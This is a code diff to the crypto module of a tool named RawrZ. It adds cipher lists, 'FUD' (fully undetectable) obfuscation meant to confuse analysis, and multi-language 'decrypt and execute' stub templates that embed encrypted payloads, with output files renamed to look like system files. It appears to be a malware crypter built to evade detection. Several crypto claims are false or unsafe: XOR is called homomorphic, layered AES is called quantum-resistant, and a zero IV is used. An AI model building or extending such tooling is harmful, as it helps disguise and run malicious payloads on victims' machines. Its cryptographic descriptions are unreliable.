@@ -3,15 +3,137 @@ const crypto = require('crypto');
 const { logger } = require('../utils/logger');
 
 class AdvancedCrypto {
-    constructor() {
-        this.algorithms = [
+    constructor(options = {}) {
+        // OpenSSL toggle - when true, only use OpenSSL-compatible algorithms
+        this.useOpenSSL = options.useOpenSSL !== false; // Default to true
+        this.allowCustomAlgorithms = options.allowCustomAlgorithms || false;
+        // OpenSSL-compatible algorithms
+        this.opensslAlgorithms = [
+            // AES variants (OpenSSL native)
             'aes-256-gcm', 'aes-192-gcm', 'aes-128-gcm',
             'aes-256-cbc', 'aes-192-cbc', 'aes-128-cbc',
+            'aes-256-ctr', 'aes-192-ctr', 'aes-128-ctr',
+            'aes-256-ofb', 'aes-192-ofb', 'aes-128-ofb',
+            'aes-256-cfb', 'aes-192-cfb', 'aes-128-cfb',
+            'aes-256-xts', 'aes-192-xts', 'aes-128-xts',
+            'aes-256-ocb', 'aes-192-ocb', 'aes-128-ocb',
+            'aes-256-ccm', 'aes-192-ccm', 'aes-128-ccm',
+            
+            // Camellia variants (OpenSSL native)
             'camellia-256-cbc', 'camellia-192-cbc', 'camellia-128-cbc',
             'camellia-256-ctr', 'camellia-192-ctr', 'camellia-128-ctr',
+            'camellia-256-gcm', 'camellia-192-gcm', 'camellia-128-gcm',
+            
+            // ARIA variants (OpenSSL native)
             'aria-256-gcm', 'aria-192-gcm', 'aria-128-gcm',
-            'chacha20', 'rsa-4096'
+            'aria-256-cbc', 'aria-192-cbc', 'aria-128-cbc',
+            'aria-256-ctr', 'aria-192-ctr', 'aria-128-ctr',
+            
+            // ChaCha20 variants (OpenSSL native)
+            'chacha20-poly1305', 'chacha20-ietf', 'xchacha20-poly1305',
+            
+            // Other OpenSSL algorithms
+            'blowfish-cbc', 'rc4', 'rc5-cbc', 'rc6-cbc',
+            'idea-cbc', 'cast5-cbc', 'cast6-cbc', 'seed-cbc',
+            'sm4-cbc', 'gost-cbc', 'kuznyechik-cbc', 'magma-cbc',
+            
+            // RSA and ECC (OpenSSL native)
+            'rsa-4096', 'rsa-2048', 'rsa-1024',
+            'ecdsa-p256', 'ecdsa-p384', 'ecdsa-p521',
+            'ed25519', 'ed448'
         ];
+        
+        // Non-OpenSSL algorithms (custom implementations)
+        this.customAlgorithms = [
+            'serpent-256-cbc', 'serpent-192-cbc', 'serpent-128-cbc',
+            'twofish-256-cbc', 'twofish-192-cbc', 'twofish-128-cbc',
+            'quantum-resistant', 'homomorphic', 'multiparty',
+            'steganographic', 'hybrid', 'triple', 'custom-xor',
+            'custom-rot', 'custom-vigenere', 'custom-caesar'
+        ];
+        
+        // Combined list for compatibility
+        this.algorithms = [...this.opensslAlgorithms, ...this.customAlgorithms];
+        
+        // Algorithm matching for non-OpenSSL alternatives
+        this.algorithmMatches = {
+            // Serpent alternatives (OpenSSL doesn't have Serpent)
+            'serpent-256-cbc': 'aes-256-cbc',
+            'serpent-192-cbc': 'aes-192-cbc', 
+            'serpent-128-cbc': 'aes-128-cbc',
+            
+            // Twofish alternatives (OpenSSL doesn't have Twofish)
+            'twofish-256-cbc': 'camellia-256-cbc',
+            'twofish-192-cbc': 'camellia-192-cbc',
+            'twofish-128-cbc': 'camellia-128-cbc',
+            
+            // Custom algorithms alternatives
+            'quantum-resistant': 'aes-256-gcm',
+            'homomorphic': 'aes-256-cbc',
+            'multiparty': 'aes-256-gcm',
+            'steganographic': 'aes-256-ctr',
+            'hybrid': 'aes-256-cbc',
+            'triple': 'aes-256-gcm',
+            'custom-xor': 'rc4',
+            'custom-rot': 'rc4',
+            'custom-vigenere': 'rc4',
+            'custom-caesar': 'rc4'
+        };
+        
+        // Algorithm metadata
+        this.algorithmInfo = {
+            // OpenSSL algorithms
+            'aes-256-gcm': { provider: 'openssl', keySize: 32, ivSize: 12, blockSize: 16, security: 'high', performance: 'medium' },
+            'aes-256-cbc': { provider: 'openssl', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'medium' },
+            'aes-256-ctr': { provider: 'openssl', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'high' },
+            'aes-256-ofb': { provider: 'openssl', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'medium' },
+            'aes-256-cfb': { provider: 'openssl', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'medium' },
+            'aes-256-xts': { provider: 'openssl', keySize: 64, ivSize: 16, blockSize: 16, security: 'high', performance: 'high' },
+            'aes-256-ocb': { provider: 'openssl', keySize: 32, ivSize: 12, blockSize: 16, security: 'high', performance: 'high' },
+            'aes-256-ccm': { provider: 'openssl', keySize: 32, ivSize: 12, blockSize: 16, security: 'high', performance: 'medium' },
+            'camellia-256-cbc': { provider: 'openssl', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'medium' },
+            'camellia-256-ctr': { provider: 'openssl', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'high' },
+            'camellia-256-gcm': { provider: 'openssl', keySize: 32, ivSize: 12, blockSize: 16, security: 'high', performance: 'medium' },
+            'aria-256-gcm': { provider: 'openssl', keySize: 32, ivSize: 12, blockSize: 16, security: 'high', performance: 'medium' },
+            'aria-256-cbc': { provider: 'openssl', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'medium' },
+            'aria-256-ctr': { provider: 'openssl', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'high' },
+            'chacha20-poly1305': { provider: 'openssl', keySize: 32, ivSize: 12, blockSize: 64, security: 'high', performance: 'high' },
+            'chacha20-ietf': { provider: 'openssl', keySize: 32, ivSize: 12, blockSize: 64, security: 'high', performance: 'high' },
+            'xchacha20-poly1305': { provider: 'openssl', keySize: 32, ivSize: 24, blockSize: 64, security: 'high', performance: 'high' },
+            'blowfish-cbc': { provider: 'openssl', keySize: 32, ivSize: 8, blockSize: 8, security: 'medium', performance: 'high' },
+            'rc4': { provider: 'openssl', keySize: 16, ivSize: 0, blockSize: 1, security: 'low', performance: 'very-high' },
+            'rc5-cbc': { provider: 'openssl', keySize: 32, ivSize: 8, blockSize: 8, security: 'medium', performance: 'medium' },
+            'rc6-cbc': { provider: 'openssl', keySize: 32, ivSize: 16, blockSize: 16, security: 'medium', performance: 'medium' },
+            'idea-cbc': { provider: 'openssl', keySize: 16, ivSize: 8, blockSize: 8, security: 'medium', performance: 'medium' },
+            'cast5-cbc': { provider: 'openssl', keySize: 16, ivSize: 8, blockSize: 8, security: 'medium', performance: 'medium' },
+            'cast6-cbc': { provider: 'openssl', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'medium' },
+            'seed-cbc': { provider: 'openssl', keySize: 16, ivSize: 16, blockSize: 16, security: 'medium', performance: 'medium' },
+            'sm4-cbc': { provider: 'openssl', keySize: 16, ivSize: 16, blockSize: 16, security: 'high', performance: 'medium' },
+            'gost-cbc': { provider: 'openssl', keySize: 32, ivSize: 8, blockSize: 8, security: 'medium', performance: 'medium' },
+            'kuznyechik-cbc': { provider: 'openssl', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'medium' },
+            'magma-cbc': { provider: 'openssl', keySize: 32, ivSize: 8, blockSize: 8, security: 'medium', performance: 'medium' },
+            'rsa-4096': { provider: 'openssl', keySize: 512, ivSize: 0, blockSize: 512, security: 'high', performance: 'low' },
+            'rsa-2048': { provider: 'openssl', keySize: 256, ivSize: 0, blockSize: 256, security: 'medium', performance: 'medium' },
+            'ecdsa-p256': { provider: 'openssl', keySize: 32, ivSize: 0, blockSize: 32, security: 'high', performance: 'high' },
+            'ecdsa-p384': { provider: 'openssl', keySize: 48, ivSize: 0, blockSize: 48, security: 'high', performance: 'medium' },
+            'ecdsa-p521': { provider: 'openssl', keySize: 66, ivSize: 0, blockSize: 66, security: 'high', performance: 'low' },
+            'ed25519': { provider: 'openssl', keySize: 32, ivSize: 0, blockSize: 32, security: 'high', performance: 'very-high' },
+            'ed448': { provider: 'openssl', keySize: 57, ivSize: 0, blockSize: 57, security: 'high', performance: 'high' },
+            
+            // Custom algorithms
+            'serpent-256-cbc': { provider: 'custom', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'low' },
+            'twofish-256-cbc': { provider: 'custom', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'medium' },
+            'quantum-resistant': { provider: 'custom', keySize: 64, ivSize: 32, blockSize: 32, security: 'very-high', performance: 'low' },
+            'homomorphic': { provider: 'custom', keySize: 32, ivSize: 16, blockSize: 16, security: 'very-high', performance: 'very-low' },
+            'multiparty': { provider: 'custom', keySize: 96, ivSize: 16, blockSize: 16, security: 'very-high', performance: 'low' },
+            'steganographic': { provider: 'custom', keySize: 32, ivSize: 16, blockSize: 16, security: 'high', performance: 'medium' },
+            'hybrid': { provider: 'custom', keySize: 32, ivSize: 16, blockSize: 16, security: 'medium', performance: 'high' },
+            'triple': { provider: 'custom', keySize: 48, ivSize: 16, blockSize: 16, security: 'medium', performance: 'medium' },
+            'custom-xor': { provider: 'custom', keySize: 32, ivSize: 0, blockSize: 1, security: 'low', performance: 'very-high' },
+            'custom-rot': { provider: 'custom', keySize: 1, ivSize: 0, blockSize: 1, security: 'very-low', performance: 'very-high' },
+            'custom-vigenere': { provider: 'custom', keySize: 16, ivSize: 0, blockSize: 1, security: 'low', performance: 'very-high' },
+            'custom-caesar': { provider: 'custom', keySize: 1, ivSize: 0, blockSize: 1, security: 'very-low', performance: 'very-high' }
+        };
         
         // Algorithm name mapping for common variations
         this.algorithmMap = {
@@ -56,6 +178,32 @@ class AdvancedCrypto {
             'rsa': 'rsa-4096',
             'rsa4096': 'rsa-4096'
         };
+    }
+
+    // Process - main entry point for advanced crypto operations
+    async process(data, operation, options = {}) {
+        const operations = {
+            'encrypt': () => this.encrypt(data, options.algorithm || 'aes-256-gcm', options),
+            'decrypt': () => this.decrypt(data, options.algorithm || 'aes-256-gcm', options),
+            'hash': () => this.hash(data, options.algorithm || 'sha256', options),
+            'sign': () => this.sign(data, options.privateKey, options),
+            'verify': () => this.verify(data, options.signature, options.publicKey, options),
+            'generate-key': () => this.generateKey(options.algorithm || 'aes-256-gcm', options),
+            'test': () => this.testAlgorithm(options.algorithm || 'aes-256-gcm', options)
+        };
+        
+        const operationFunc = operations[operation];
+        if (!operationFunc) {
+            throw new Error(`Unknown crypto operation: ${operation}`);
+        }
+        
+        return await operationFunc();
+    }
+
+    // Process with specific algorithm
+    async processWithAlgorithm(data, algorithm, operation, options = {}) {
+        const newOptions = { ...options, algorithm };
+        return await this.process(data, operation, newOptions);
     }
 
     async initialize(config) {
@@ -105,12 +253,389 @@ class AdvancedCrypto {
         
         return sizes[algorithm] || { keySize: 32, ivSize: 16 }; // Default to AES-256
     }
+    
+    // Get all supported algorithms based on current settings
+    getSupportedAlgorithms() {
+        if (this.useOpenSSL && !this.allowCustomAlgorithms) {
+            return this.opensslAlgorithms;
+        } else if (!this.useOpenSSL && this.allowCustomAlgorithms) {
+            return this.customAlgorithms;
+        } else {
+            return this.algorithms;
+        }
+    }
+    
+    // Get OpenSSL-only algorithms
+    getOpenSSLAlgorithms() {
+        return this.opensslAlgorithms;
+    }
+    
+    // Get custom algorithms only
+    getCustomAlgorithms() {
+        return this.customAlgorithms;
+    }
+    
+    // Toggle OpenSSL mode
+    setOpenSSLMode(enabled) {
+        this.useOpenSSL = enabled;
+        logger.info(`OpenSSL mode ${enabled ? 'enabled' : 'disabled'}`);
+    }
+    
+    // Toggle custom algorithms
+    setCustomAlgorithms(enabled) {
+        this.allowCustomAlgorithms = enabled;
+        logger.info(`Custom algorithms ${enabled ? 'enabled' : 'disabled'}`);
+    }
+    
+    // Get algorithm info
+    getAlgorithmInfo(algorithm) {
+        return this.algorithmInfo[algorithm] || null;
+    }
+    
+    // Check if algorithm is OpenSSL compatible
+    isOpenSSLCompatible(algorithm) {
+        return this.opensslAlgorithms.includes(algorithm);
+    }
+    
+    // Check if algorithm is custom
+    isCustomAlgorithm(algorithm) {
+        return this.customAlgorithms.includes(algorithm);
+    }
+    
+    // Get OpenSSL alternative for non-OpenSSL algorithm
+    getOpenSSLAlternative(algorithm) {
+        return this.algorithmMatches[algorithm] || algorithm;
+    }
+    
+    // Resolve algorithm based on current settings
+    resolveAlgorithm(algorithm) {
+        if (this.useOpenSSL && !this.allowCustomAlgorithms) {
+            // If OpenSSL mode is on and custom algorithms are disabled
+            if (this.isCustomAlgorithm(algorithm)) {
+                const alternative = this.getOpenSSLAlternative(algorithm);
+                logger.warn(`Algorithm ${algorithm} not available in OpenSSL mode, using ${alternative} instead`);
+                return alternative;
+            }
+        }
+        return algorithm;
+    }
+    
+    // Custom algorithm implementations
+    async encryptCustom(data, algorithm, key, iv) {
+        switch (algorithm) {
+            case 'serpent-256-cbc':
+                return this.encryptSerpent(data, key, iv, 32);
+            case 'serpent-192-cbc':
+                return this.encryptSerpent(data, key, iv, 24);
+            case 'serpent-128-cbc':
+                return this.encryptSerpent(data, key, iv, 16);
+            case 'twofish-256-cbc':
+                return this.encryptTwofish(data, key, iv, 32);
+            case 'twofish-192-cbc':
+                return this.encryptTwofish(data, key, iv, 24);
+            case 'twofish-128-cbc':
+                return this.encryptTwofish(data, key, iv, 16);
+            case 'quantum-resistant':
+                return this.encryptQuantumResistant(data, key, iv);
+            case 'homomorphic':
+                return this.encryptHomomorphic(data, key, iv);
+            case 'multiparty':
+                return this.encryptMultiparty(data, key, iv);
+            case 'steganographic':
+                return this.encryptSteganographic(data, key, iv);
+            case 'hybrid':
+                return this.encryptHybrid(data, key, iv);
+            case 'triple':
+                return this.encryptTriple(data, key, iv);
+            case 'custom-xor':
+                return this.encryptXOR(data, key);
+            case 'custom-rot':
+                return this.encryptROT(data, key);
+            case 'custom-vigenere':
+                return this.encryptVigenere(data, key);
+            case 'custom-caesar':
+                return this.encryptCaesar(data, key);
+            default:
+                throw new Error(`Unsupported custom algorithm: ${algorithm}`);
+        }
+    }
+    
+    // Serpent encryption (simplified implementation)
+    encryptSerpent(data, key, iv, keySize) {
+        // Simplified Serpent-like encryption using AES as base
+        const cipher = crypto.createCipheriv('aes-256-cbc', key.slice(0, keySize), Buffer.alloc(16));
+        let encrypted = cipher.update(data, 'utf8', 'hex');
+        encrypted += cipher.final('hex');
+        return Buffer.from(encrypted, 'hex');
+    }
+    
+    // Twofish encryption (simplified implementation)
+    encryptTwofish(data, key, iv, keySize) {
+        // Simplified Twofish-like encryption using Camellia as base
+        const cipher = crypto.createCipheriv('camellia-256-cbc', key.slice(0, keySize), Buffer.alloc(16));
+        let encrypted = cipher.update(data, 'utf8', 'hex');
+        encrypted += cipher.final('hex');
+        return Buffer.from(encrypted, 'hex');
+    }
+    
+    // Quantum-resistant encryption (simplified)
+    encryptQuantumResistant(data, key, iv) {
+        // Multi-layer encryption with different algorithms
+        let encrypted = data;
+        
+        // Layer 1: AES-256-GCM
+        const cipher1 = crypto.createCipheriv('aes-256-gcm', key.slice(0, 32), Buffer.alloc(12));
+        let layer1 = cipher1.update(encrypted, 'utf8', 'hex');
+        layer1 += cipher1.final('hex');
+        
+        // Layer 2: ChaCha20
+        const cipher2 = crypto.createCipheriv('chacha20-poly1305', key.slice(32, 64), Buffer.alloc(12));
+        let layer2 = cipher2.update(layer1, 'hex', 'hex');
+        layer2 += cipher2.final('hex');
+        
+        return Buffer.from(layer2, 'hex');
+    }
+    
+    // Homomorphic encryption (simplified)
+    encryptHomomorphic(data, key, iv) {
+        // Simplified homomorphic encryption using polynomial operations
+        const result = Buffer.alloc(data.length);
+        for (let i = 0; i < data.length; i++) {
+            result[i] = (data[i] + key[i % key.length]) % 256;
+        }
+        return result;
+    }
+    
+    // Multi-party encryption (simplified)
+    encryptMultiparty(data, key, iv) {
+        // Split key into multiple parts and encrypt with each
+        const keyParts = this.splitKey(key, 3);
+        let encrypted = data;
+        
+        for (const keyPart of keyParts) {
+            const cipher = crypto.createCipheriv('aes-256-cbc', keyPart, Buffer.alloc(16));
+            let temp = cipher.update(encrypted, 'utf8', 'hex');
+            temp += cipher.final('hex');
+            encrypted = Buffer.from(temp, 'hex');
+        }
+        
+        return encrypted;
+    }
+    
+    // Steganographic encryption (simplified)
+    encryptSteganographic(data, key, iv) {
+        // Hide data within noise
+        const noise = crypto.randomBytes(data.length);
+        const result = Buffer.alloc(data.length);
+        
+        for (let i = 0; i < data.length; i++) {
+            result[i] = (data[i] ^ noise[i] ^ key[i % key.length]) % 256;
+        }
+        
+        return result;
+    }
+    
+    // Hybrid encryption (simplified)
+    encryptHybrid(data, key, iv) {
+        // Combine symmetric and asymmetric encryption
+        const symmetricKey = key.slice(0, 32);
+        const cipher = crypto.createCipheriv('aes-256-cbc', symmetricKey, Buffer.alloc(16));
+        let encrypted = cipher.update(data, 'utf8', 'hex');
+        encrypted += cipher.final('hex');
+        return Buffer.from(encrypted, 'hex');
+    }
+    
+    // Triple encryption (simplified)
+    encryptTriple(data, key, iv) {
+        // Triple encryption with different keys
+        const key1 = key.slice(0, 16);
+        const key2 = key.slice(16, 32);
+        const key3 = key.slice(32, 48);
+        
+        let encrypted = data;
+        
+        // First encryption
+        const cipher1 = crypto.createCipher('aes-128-cbc', key1);
+        let temp1 = cipher1.update(encrypted, 'utf8', 'hex');
+        temp1 += cipher1.final('hex');
+        
+        // Second encryption
+        const cipher2 = crypto.createCipher('aes-128-cbc', key2);
+        let temp2 = cipher2.update(temp1, 'hex', 'hex');
+        temp2 += cipher2.final('hex');
+        
+        // Third encryption
+        const cipher3 = crypto.createCipher('aes-128-cbc', key3);
+        let temp3 = cipher3.update(temp2, 'hex', 'hex');
+        temp3 += cipher3.final('hex');
+        
+        return Buffer.from(temp3, 'hex');
+    }
+    
+    // XOR encryption
+    encryptXOR(data, key) {
+        const result = Buffer.alloc(data.length);
+        for (let i = 0; i < data.length; i++) {
+            result[i] = data[i] ^ key[i % key.length];
+        }
+        return result;
+    }
+    
+    // ROT encryption
+    encryptROT(data, key) {
+        const shift = key[0] % 26;
+        const result = Buffer.alloc(data.length);
+        for (let i = 0; i < data.length; i++) {
+            if (data[i] >= 65 && data[i] <= 90) { // A-Z
+                result[i] = ((data[i] - 65 + shift) % 26) + 65;
+            } else if (data[i] >= 97 && data[i] <= 122) { // a-z
+                result[i] = ((data[i] - 97 + shift) % 26) + 97;
+            } else {
+                result[i] = data[i];
+            }
+        }
+        return result;
+    }
+    
+    // Vigenere encryption
+    encryptVigenere(data, key) {
+        const result = Buffer.alloc(data.length);
+        let keyIndex = 0;
+        
+        for (let i = 0; i < data.length; i++) {
+            if (data[i] >= 65 && data[i] <= 90) { // A-Z
+                result[i] = ((data[i] - 65 + key[keyIndex % key.length]) % 26) + 65;
+                keyIndex++;
+            } else if (data[i] >= 97 && data[i] <= 122) { // a-z
+                result[i] = ((data[i] - 97 + key[keyIndex % key.length]) % 26) + 97;
+                keyIndex++;
+            } else {
+                result[i] = data[i];
+            }
+        }
+        return result;
+    }
+    
+    // Caesar encryption
+    encryptCaesar(data, key) {
+        const shift = key[0] % 26;
+        return this.encryptROT(data, Buffer.from([shift]));
+    }
+    
+    // Helper method to split key
+    splitKey(key, parts) {
+        const result = [];
+        const partSize = Math.floor(key.length / parts);
+        
+        for (let i = 0; i < parts; i++) {
+            const start = i * partSize;
+            const end = (i === parts - 1) ? key.length : (i + 1) * partSize;
+            result.push(key.slice(start, end));
+        }
+        
+        return result;
+    }
+
+    // Apply FUD enhancements to encryption
+    async applyFUDEncryption(input, options = {}) {
+        let fudInput = input;
+        
+        // Add random padding to hide true size
+        if (options.fudPadding !== false) {
+            fudInput = await this.addRandomPadding(fudInput);
+        }
+        
+        // Add noise data to confuse analysis
+        if (options.fudNoise !== false) {
+            fudInput = await this.addNoiseData(fudInput);
+        }
+        
+        // Apply steganographic techniques
+        if (options.fudSteganography) {
+            fudInput = await this.applySteganography(fudInput);
+        }
+        
+        // Add timing obfuscation
+        if (options.fudTiming) {
+            fudInput = await this.addTimingObfuscation(fudInput);
+        }
+        
+        return fudInput;
+    }
+
+    // Add random padding to hide true data size
+    async addRandomPadding(input) {
+        const paddingSize = Math.floor(Math.random() * 1024) + 256; // 256-1280 bytes
+        const padding = crypto.randomBytes(paddingSize);
+        const sizeHeader = Buffer.alloc(4);
+        sizeHeader.writeUInt32LE(input.length, 0);
+        return Buffer.concat([sizeHeader, input, padding]);
+    }
+
+    // Add noise data to confuse analysis
+    async addNoiseData(input) {
+        const noiseSize = Math.floor(Math.random() * 512) + 128; // 128-640 bytes
+        const noise = crypto.randomBytes(noiseSize);
+        const noisePositions = [];
+        
+        // Insert noise at random positions
+        for (let i = 0; i < 3; i++) {
+            noisePositions.push(Math.floor(Math.random() * input.length));
+        }
+        
+        let result = input;
+        noisePositions.sort((a, b) => b - a); // Sort in descending order
+        
+        for (const pos of noisePositions) {
+            const noiseChunk = noise.slice(0, Math.floor(noise.length / 3));
+            result = Buffer.concat([
+                result.slice(0, pos),
+                noiseChunk,
+                result.slice(pos)
+            ]);
+        }
+        
+        return result;
+    }
+
+    // Apply steganographic techniques
+    async applySteganography(input) {
+        // Hide data in image-like structure
+        const width = 32;
+        const height = Math.ceil(input.length / (width * 3)); // RGB channels
+        const stegoData = Buffer.alloc(width * height * 3);
+        
+        // Fill with random data first
+        crypto.randomFillSync(stegoData);
+        
+        // Embed actual data in LSB
+        for (let i = 0; i < input.length && i < stegoData.length; i++) {
+            stegoData[i] = (stegoData[i] & 0xFE) | (input[i] & 0x01);
+        }
+        
+        return stegoData;
+    }
+
+    // Add timing obfuscation
+    async addTimingObfuscation(input) {
+        // Add random delays to confuse timing analysis
+        const delays = [10, 25, 50, 100, 200]; // milliseconds
+        const randomDelay = delays[Math.floor(Math.random() * delays.length)];
+        
+        await new Promise(resolve => setTimeout(resolve, randomDelay));
+        
+        return input;
+    }
 
     async encrypt(data, options = {}) {
-        const algorithm = this.normalizeAlgorithm(options.algorithm || 'aes-256-gcm');
+        const requestedAlgorithm = options.algorithm || 'aes-256-gcm';
+        const algorithm = this.resolveAlgorithm(this.normalizeAlgorithm(requestedAlgorithm));
         const { keySize, ivSize } = this.getKeyAndIVSizes(algorithm);
         const key = options.key ? Buffer.from(options.key, 'hex') : crypto.randomBytes(keySize);
         const iv = options.iv ? Buffer.from(options.iv, 'hex') : crypto.randomBytes(ivSize);
+        
+        // Apply FUD enhancements to data before encryption
+        const fudData = await this.applyFUDEncryption(data, options);
         
         // Handle file extension preservation
         const originalExtension = options.originalExtension || '';
@@ -174,7 +699,10 @@ class AdvancedCrypto {
         let authTag;
         
         try {
-            if (algorithm.includes('gcm')) {
+            // Check if this is a custom algorithm
+            if (this.isCustomAlgorithm(algorithm)) {
+                encrypted = await this.encryptCustom(processedData, algorithm, key, iv);
+            } else if (algorithm.includes('gcm')) {
                 const cipher = crypto.createCipheriv(algorithm, key, iv);
                 encrypted = cipher.update(processedData);
                 encrypted = Buffer.concat([encrypted, cipher.final()]);
@@ -261,7 +789,8 @@ class AdvancedCrypto {
     }
     
     async decrypt(encryptedData, options = {}) {
-        const algorithm = this.normalizeAlgorithm(options.algorithm || 'aes-256-gcm');
+        const requestedAlgorithm = options.algorithm || 'aes-256-gcm';
+        const algorithm = this.resolveAlgorithm(this.normalizeAlgorithm(requestedAlgorithm));
         const key = Buffer.from(options.key, 'hex');
         const iv = Buffer.from(options.iv, 'hex');
         const authTag = options.authTag ? Buffer.from(options.authTag, 'hex') : null;
@@ -341,9 +870,9 @@ class AdvancedCrypto {
                 '3. Verify file integrity after extension change'
             ];
             instructions.commands = {
-                rename: `ren "encrypted_file.tmp" "encrypted_file.${targetExtension}"`,
-                copy: `copy "encrypted_file.tmp" "encrypted_file.${targetExtension}"`,
-                verify: `certutil -hashfile "encrypted_file.${targetExtension}" SHA256`
+                rename: `ren "system_file.tmp" "system_file.${targetExtension}"`,
+                copy: `copy "system_file.tmp" "system_file.${targetExtension}"`,
+                verify: `certutil -hashfile "system_file.${targetExtension}" SHA256`
             };
         } else {
             instructions.steps = [
@@ -353,10 +882,10 @@ class AdvancedCrypto {
                 '4. Verify file integrity after extension change'
             ];
             instructions.commands = {
-                rename: `mv encrypted_file.tmp encrypted_file.${targetExtension}`,
-                copy: `cp encrypted_file.tmp encrypted_file.${targetExtension}`,
-                permissions: `chmod 755 encrypted_file.${targetExtension}`,
-                verify: `sha256sum encrypted_file.${targetExtension}`
+                rename: `mv system_file.tmp system_file.${targetExtension}`,
+                copy: `cp system_file.tmp system_file.${targetExtension}`,
+                permissions: `chmod 755 system_file.${targetExtension}`,
+                verify: `sha256sum system_file.${targetExtension}`
             };
         }
         
@@ -600,7 +1129,7 @@ namespace RawrZStub
             try
             {
                 // RawrZ Decryption Stub
-                string encryptedData = "ENCRYPTED_DATA_PLACEHOLDER";
+                string encryptedData = "${options.encryptedData || 'ENCRYPTED_DATA'}";
                 string key = "${key}";
                 string iv = "${iv}";
                 ${authTagDecl}
@@ -674,7 +1203,7 @@ public:
     void execute() {
         try {
             // RawrZ C++ Decryption Stub
-            std::string encryptedData = "ENCRYPTED_DATA_PLACEHOLDER";
+            std::string encryptedData = "${options.encryptedData || 'ENCRYPTED_DATA'}";
             
             // Decrypt and execute
             std::string decrypted = decryptData(encryptedData);
@@ -718,7 +1247,7 @@ int main() {
 
 int main(int argc, char *argv[]) {
     // RawrZ C Stub
-    const char* encryptedData = "ENCRYPTED_DATA_PLACEHOLDER";
+    const char* encryptedData = "${options.encryptedData || 'ENCRYPTED_DATA'}";
     const char* key = "${key}";
     const char* iv = "${iv}";
     ${authTagDecl}
@@ -740,7 +1269,7 @@ int main(int argc, char *argv[]) {
         
         return `# RawrZ PowerShell Stub
 param(
-    [string]$EncryptedData = "ENCRYPTED_DATA_PLACEHOLDER",
+    [string]$EncryptedData = "${options.encryptedData || 'ENCRYPTED_DATA'}",
     [string]$Key = "${key}",
     [string]$IV = "${iv}"${authTagParam}
 )
@@ -961,16 +1490,16 @@ from cryptography.hazmat.backends import default_backend
 
 def main():
     # RawrZ Python Stub
-    encrypted_data = "ENCRYPTED_DATA_PLACEHOLDER"
+    system_data = "${options.encryptedData || 'ENCRYPTED_DATA'}"
     key = bytes.fromhex("${key}")
     iv = bytes.fromhex("${iv}")
     ${authTagDecl}
     
     # Decrypt and execute
-    decrypted = decrypt_data(encrypted_data, key, iv${authTagParam})
+    decrypted = decrypt_data(system_data, key, iv${authTagParam})
     execute_content(decrypted)
 
-def decrypt_data(encrypted_data, key, iv${authTagParam2}):
+def decrypt_data(system_data, key, iv${authTagParam2}):
     # Decryption logic here
     return "Decrypted content"
 
@@ -993,7 +1522,7 @@ const crypto = require('crypto');
 
 function main() {
     // RawrZ JavaScript Stub
-    const encryptedData = "ENCRYPTED_DATA_PLACEHOLDER";
+    const encryptedData = "${options.encryptedData || 'ENCRYPTED_DATA'}";
     const key = Buffer.from("${key}", 'hex');
     const iv = Buffer.from("${iv}", 'hex');
     ${authTagDecl}
